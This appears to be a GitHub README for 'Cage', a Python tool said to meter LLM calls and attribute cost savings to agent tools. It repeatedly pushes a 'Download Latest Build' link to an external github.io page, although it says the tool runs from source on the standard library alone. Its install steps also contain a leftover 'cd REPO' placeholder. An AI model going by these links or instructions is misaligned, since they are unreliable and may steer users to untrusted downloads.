# Cage - AI Cost Attribution Tool 2026

> **Cage is a Python CLI, library, and MCP tool for measuring LLM usage, attributing savings to individual agent tools, and comparing AI-assisted work against human cost baselines.**

[![Platform](https://img.shields.io/badge/Platform-Python%20CLI-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/edwardsandre1961/cage-ai-cost-cli?style=flat-square)](https://github.com/edwardsandre1961/cage-ai-cost-cli)

---

<p align="center">
  <a href="https://edwardsandre1961.github.io/cage-ai-cost-cli/">
    <img src="https://img.shields.io/badge/Download-Cage%20Latest-brightgreen?style=for-the-badge" alt="Download Cage">
  </a>
</p>

> **[Download - Cage](https://edwardsandre1961.github.io/cage-ai-cost-cli/)**

---

[Download Latest Build](https://edwardsandre1961.github.io/cage-ai-cost-cli/)

---

## About Cage

Cage builds an attribution model on top of AI usage data so you can see what each tool actually contributes. Instead of reporting only a flat infrastructure bill, it meters LLM calls, captures token activity, and surfaces both gross and net savings tied to agent-driven work.

Teams assessing AI workflows use Cage to link usage measurements with tool adoption and successful task outcomes. Its ledgers and counterfactual analyses keep measured results distinct from modeled or estimated figures, giving you a structured way to examine cost, savings, and alternatives.

---

## Features

- Meter LLM calls and keep token-usage records
- Compute gross and net savings for each tool
- Produce deterministic attribution ledgers
- Generate counterfactual matrices across tool combinations
- Separate measured, modeled, and estimated values
- Track adoption of agent tools
- Report quality-adjusted cost per successful task
- Provide CLI, Python library, and MCP interfaces
- Integrate with Claude Code, Copilot, and Kiro workflows
- Run on Python 3.11+ with the standard library only

---

## Installation

Clone the repository and move into its directory:

    git clone https://github.com/edwardsandre1961/cage-ai-cost-cli.git
    cd REPO

Cage needs Python 3.11 or newer and pulls in no third-party runtime dependencies. Start it through the CLI entry point documented in the repository, or import the library into your own Python workflow.

To use it over MCP, register Cage as an MCP server in whichever client will consume its tools.

---

## Usage

A common Cage workflow looks like this:

1. Attach the CLI, Python library, or MCP interface to the agent workflow under evaluation.
2. Meter LLM calls and gather token-usage data.
3. Log which tools were used and which tasks they supported.
4. Assemble an attribution ledger from the collected measurements.
5. Review gross savings, net savings, and quality-adjusted cost per successful task.
6. Compare alternative tool combinations through counterfactual analysis.
7. Check whether each reported figure is measured, modeled, or estimated.

Cage can also reveal adoption patterns across supported agent environments, including Claude Code, Copilot, and Kiro.

---

## Configuration

Cage runs on Python's standard library, so there is no dependency installation step. Set it up through the options and integration settings of the interface you choose:

- Choose the CLI for terminal-based measurement and reporting.
- Choose the Python library when attribution belongs inside an application or analysis pipeline.
- Choose the MCP interface when connecting Cage to an MCP-compatible agent workflow.

Keep usage records and attribution inputs consistent between runs so deterministic ledgers and comparisons stay reproducible.

---

## Requirements

- Python 3.11 or newer
- A supported Python environment for the CLI or library
- Standard library only; no external runtime packages
- An LLM or agent workflow whose calls and tool activity can be measured
- An optional MCP-compatible client for MCP integration
- Enough storage for collected usage records and generated analysis data

---

## FAQ

### What does Cage measure?

Cage measures LLM calls and token usage, then ties that activity to tool-level savings, adoption, and task outcomes.

### How are savings represented?

Both gross and net savings are calculated per tool. Attribution and counterfactual analysis also let you compare AI-assisted work with a human-cost baseline.

### Does Cage distinguish certainty levels?

Yes. Each reported value is labeled as measured, modeled, or estimated, so you can see where a figure came from.

### Which interfaces are available?

Cage ships with a command-line interface, a Python library, and an MCP interface.

### Can it work with agent development tools?

Cage integrates with Claude Code, Copilot, and Kiro, and it tracks adoption across agent tools.

### Are third-party packages required?

No. Cage is built to run on Python 3.11+ using only the standard library.

### What should I check if results look unexpected?

Make sure LLM calls, token usage, tool events, and successful-task outcomes are recorded consistently. Then review the attribution ledger and the measured, modeled, or estimated labels before comparing results.

### How do updates work?

Use the repository's latest build link or pull the newest revision from the Git repository. Check release notes and interface documentation before changing an existing measurement workflow.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
